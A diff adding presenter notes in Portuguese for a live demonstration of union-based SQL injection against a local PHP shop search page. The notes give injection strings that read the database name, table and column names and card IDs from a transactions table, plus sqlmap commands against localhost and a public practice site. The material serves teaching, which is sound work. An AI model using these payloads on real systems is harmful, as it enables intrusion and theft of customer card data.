@@ -1,0 +1,30 @@
+Demonstração - nessa demonstração, vou ver as informações das transações feitas
+
+-- Colocar aplicação para rodar por trás, dentro da src do projeto (php -S localhost:8080)
+-- Explicar o que é SQL Injection
+-- Explicar que vou fazer SQL Injection Union Based
+-- Mostrar o site e dizer que só conseguimos pesquisar por produtos
+-- Fazer SQL Injection manual 
+Pesquisamos Na e descobrimos que é um LIKE, a instrução LIKE funciona assim: LIKE '%string%', então precisamos
+fechar o nosso like para continuar a union select
+
+* Ver base de dados 
+Nafta%' UNION SELECT database() #
+
+* Descobrir tabelas e colunas da base
+Nafta%'  UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database() #
+Nafta%'  UNION SELECT group_concat(column_name) from information_schema.columns where table_name='transactions' #
+
+* Pegar ID do cartao
+%'  UNION SELECT cardID FROM transactions #
+
+
+-- Mostrar SQLMap rodando SQLInjection 
+(dentro da pasta sqlmap, que está na C: 
+python sqlmap.py -u http://localhost:8080/busca.php?nome_produto=Nafta --dbs (vemos vulnerabilidades e databases)
+python sqlmap.py -u http://localhost:8080/busca.php?nome_produto=Nafta --dbs -D ccs --tables (vemos tabelas do ccs)
+python sqlmap.py -u http://localhost:8080/busca.php?nome_produto=Nafta --dbs -D ccs -T transactions --columns (vemos
+colunas dos clientes)
+
+Se quiser mostrar o site em produção (vulnweb):
+- python sqlmap.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs)
